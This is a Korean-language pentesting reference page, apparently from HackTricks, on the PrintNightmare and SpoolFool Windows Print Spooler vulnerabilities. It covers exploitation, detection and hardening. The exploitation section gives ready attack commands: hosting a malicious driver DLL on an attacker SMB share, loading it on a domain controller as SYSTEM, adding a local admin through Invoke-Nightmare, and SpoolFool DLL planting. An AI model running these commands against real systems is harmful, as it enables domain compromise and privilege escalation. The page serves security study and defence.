# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare는 Windows **Print Spooler** 서비스의 취약점 모음을 통칭하는 이름으로, **SYSTEM 권한으로 임의 코드 실행**을 허용하며 스풀러에 RPC로 접근할 수 있는 경우 **도메인 컨트롤러와 파일 서버에서 원격 코드 실행(RCE)**을 허용합니다. 가장 널리 악용된 CVE는 **CVE-2021-1675**(초기에는 LPE로 분류)와 **CVE-2021-34527**(전체 RCE)입니다. 이후 발견된 **CVE-2021-34481 (“Point & Print”)** 및 **CVE-2022-21999 (“SpoolFool”)** 등의 문제는 공격 표면이 아직 완전히 닫히지 않았음을 보여줍니다.

**드라이버 기반 RCE/LPE**가 아니라 스풀러를 통한 **인증 강제 / relay**를 찾고 있다면, [프린터 coercion 악용에 관한 다른 페이지](printers-spooler-service-abuse.md)를 확인하세요. 이 페이지에서는 **SYSTEM 권한으로 드라이버 / DLL을 로드하는 방법**을 다룹니다.

---

## 1. 취약한 구성 요소 및 CVE

| 연도 | CVE | 짧은 이름 | 기본 동작 | 참고 |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021년 6월 CU에서 패치되었지만 CVE-2021-34527로 우회됨|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`를 통해 인증된 사용자가 원격 공유에서 드라이버 DLL을 로드할 수 있음. 2021년 8월 이후에는 일반적으로 약화된 Point & Print 정책이 필요함|
|2021|CVE-2021-34481|“Point & Print”|LPE|비관리자 사용자가 서명되지 않은 드라이버를 설치할 수 있음|
|2022|CVE-2022-21999|“SpoolFool”|LPE|임의 디렉터리 생성 → DLL planting. 2021년 패치 이후에도 작동함|

모두 **MS-RPRN / MS-PAR RPC 메서드**(`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) 중 하나 또는 **Point & Print** 내부의 신뢰 관계를 악용합니다.

## 2. Exploitation 기법

### 2.1 원격 도메인 컨트롤러 장악 (CVE-2021-34527)

인증된 **비특권** 도메인 사용자는 다음 방법으로 원격 스풀러(흔히 DC)에서 임의 DLL을 **NT AUTHORITY\SYSTEM** 권한으로 실행할 수 있습니다:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Popular PoC에는 **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#), 그리고 **mimikatz**의 Benjamin Delpy가 만든 `misc::printnightmare / lsa::addsid` 모듈이 있습니다.

### 2.2 Local privilege escalation (지원되는 모든 Windows 버전, 2021-2024)

같은 API를 **로컬에서** 호출해 `C:\Windows\System32\spool\drivers\x64\3\`에서 드라이버를 로드하고 SYSTEM 권한을 획득할 수 있습니다:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 패치된 호스트에서의 최신 triage

완전히 업데이트된 호스트에서는 Windows가 기본적으로 프린터 드라이버를 **관리자만 설치할 수 있도록** 설정하기 때문에 공개 PrintNightmare PoC가 자주 실패합니다(2021년 8월 10일부터 `RestrictDriverInstallationToAdministrators=1`). 대상에 exploit을 시도하기 전에, 먼저 레거시 프린터 배포를 위해 환경에서 이 안전 조치를 롤백했는지 확인하세요:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

가장 주목할 만한 취약한 값은 보통 다음과 같습니다:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoC를 실행하기 전에 Linux에서 대상이 관련 print RPC 인터페이스를 노출하는지 빠르게 확인합니다:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

일부 최신 공개 도구는 DLL을 전송하기 전에 더 안전하게 **확인/목록화**하는 워크플로도 제공합니다:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> 저권한 사용자로 `RPC_E_ACCESS_DENIED` (`0x8001011b`)가 발생한다면, 대개 전송 실패가 아니라 2021년 이후의 기본 설정이 적용된 것입니다.

> Windows 11 22H2 이상 및 최신 클라이언트 빌드에서는 원격 인쇄가 기본적으로 **RPC over TCP**를 사용하며, **RPC over named pipes** (`\PIPE\spoolss`)는 명시적으로 다시 활성화하지 않는 한 비활성화됩니다. 일부 오래된 PoC와 실습 환경 문서는 여전히 named pipe에 접근할 수 있다고 가정합니다.<sup>[[4]](#references)</sup>

### 2.4 “패치된” 네트워크에서의 Package Point & Print 악용

많은 엔터프라이즈 환경에서는 헬프데스크 또는 print-server 워크플로에서 비관리자 사용자가 드라이버를 설치하거나 업데이트해야 했기 때문에, 2021년 최초 패치 이후에도 정책상 **취약한 상태**로 남아 있었습니다. 실제 공격 절차는 다음과 같습니다.

- 보안 프롬프트가 완전히 비활성화되어 있다면, **기존의 임의 DLL을 이용한 PrintNightmare**가 여전히 가장 간단한 경로입니다.
- `Only use Package Point and Print`가 활성화되어 있다면, 일반적으로 원시 DLL을 배포하는 대신 **서명된 package-aware driver** 경로로 전환해야 합니다.<sup>[[3]](#references)</sup>
- 2024년 연구에 따르면 **`Package Point and Print - Approved servers`만으로는 확실한 신뢰 경계가 되지 않습니다**. 공격자가 승인된 print server 중 하나의 이름 확인을 스푸핑하거나 하이재킹할 수 있다면, 정책 검사를 통과하는 악성 서버로 피해자를 리디렉션할 수 있습니다.<sup>[[4]](#references)</sup>
- UNC hardening과 강제된 RPC-over-SMB를 함께 사용하더라도 취약할 수 있습니다. 최신 클라이언트는 **RPC over TCP로 대체 연결을 시도할 수 있기 때문입니다**.<sup>[[4]](#references)</sup>

이 때문에 최신 PrintNightmare 스타일의 공격은 원래의 2021 PoC를 그대로 재현하기보다는 **엔터프라이즈 프린터 배포 정책을 악용하는 것**에 더 가까운 경우가 많습니다.

### 2.5 SpoolFool (CVE-2022-21999) – 2021년 수정 사항 우회

Microsoft의 2021년 패치는 원격 드라이버 로딩을 차단했지만 **디렉터리 권한은 강화하지 않았습니다**. SpoolFool은 `SpoolDirectory` 매개변수를 악용해 `C:\Windows\System32\spool\drivers\` 아래에 임의의 디렉터리를 만들고, 페이로드 DLL을 배치한 다음, spooler가 해당 DLL을 로드하도록 합니다.<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> 이 exploit은 2022년 2월 업데이트 이전의 완전히 패치된 Windows 7 → Windows 11 및 Server 2012R2 → 2022에서도 작동합니다<sup>[[2]](#references)</sup>

---

## 3. 탐지 및 hunting

* **PrintService 로그** – *Microsoft-Windows-PrintService/Operational* 채널을 활성화하고, 성공 및 실패 시도 모두에서 **Event ID 316**(드라이버 추가/업데이트, 일반적으로 DLL 이름 포함)을 확인합니다. 의심스러운 스풀러 모듈/드라이버 로드 실패 여부는 **Event ID 808/811**과 함께 확인합니다.
* **Sysmon** – 부모 프로세스가 **spoolsv.exe**일 때 `C:\Windows\System32\spool\drivers\*` 내의 `Event ID 7`(이미지 로드) 또는 `11/23`(파일 쓰기/삭제)을 확인합니다.
* **프로세스 계보** – **spoolsv.exe**가 `cmd.exe`, `rundll32.exe`, PowerShell 또는 예상치 못한 서명되지 않은 자식 프로세스를 생성할 때마다 경고를 발생시킵니다.
* **네트워크 텔레메트리** – **spoolsv.exe**에서 공격자가 제어하는 공유로 발생하는 예상치 못한 SMB 가져오기 또는 인쇄 서버로 동작하지 않아야 하는 서버에서 발생하는 비정상적인 프린터 RPC 트래픽은 모두 중요한 단서입니다.

## 4. 완화 및 강화

1. **패치 적용!** – Print Spooler 서비스가 설치된 모든 Windows 호스트에 최신 누적 업데이트를 적용합니다.
2. **필요하지 않은 곳에서는 스풀러를 비활성화합니다.** 특히 Domain Controller에서 비활성화합니다:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **로컬 인쇄는 허용하면서 원격 연결 차단** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print를 관리자 전용으로 유지**하려면 다음을 설정합니다:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Microsoft KB5005652의 자세한 지침<sup>[[1]](#references)</sup>
5. 비즈니스 요구 사항상 `RestrictDriverInstallationToAdministrators=0`으로 설정해야 한다면, 다른 모든 프린터 정책은 **부분적인 완화 조치일 뿐**이라고 간주하세요. 최소한 **package-aware drivers**를 우선 사용하고, **Only use Package Point and Print**를 활성화하며, **Package Point and Print - Approved servers**를 명시적으로 지정한 포리스트 내부 프린트 서버로 제한하세요.<sup>[[3]](#references)</sup>
6. 프린터 매핑 문제를 해결하려고 **프린터 RPC privacy를 롤백하지 마세요**. `RpcAuthnLevelPrivacyEnabled=0`으로 설정한 환경은 **CVE-2021-1678**에 대응해 추가된 보안 강화를 되돌리는 것이므로, 일반적으로 engagement 중 추가 조사가 필요합니다.<sup>[[4]](#references)</sup>

---

## 5. 관련 연구 / 도구

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list`, `-delete` 모드를 지원하는 표준 Impacket 구현
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – SMB 전송 기능 내장, 다중 대상 지원, `MS-RPRN` / `MS-PAR` 모드를 모두 지원하는 wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print를 통한 취약한 프린터 드라이버 직접 제공 악용
* SpoolFool exploit 및 분석 글
* SpoolFool 및 기타 spooler 버그에 대한 0patch micropatches

드라이버를 로드하는 대신 spooler를 통해 **인증을 강제로 유도**하려면 [printer spooler service abuse](printers-spooler-service-abuse.md)로 이동하세요.

---

## References

- [1] [Microsoft – KB5005652: 새로운 Point & Print 기본 드라이버 설치 동작 관리](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024년 PrintNightmare 실전 가이드](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare는 아직 끝나지 않았다](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
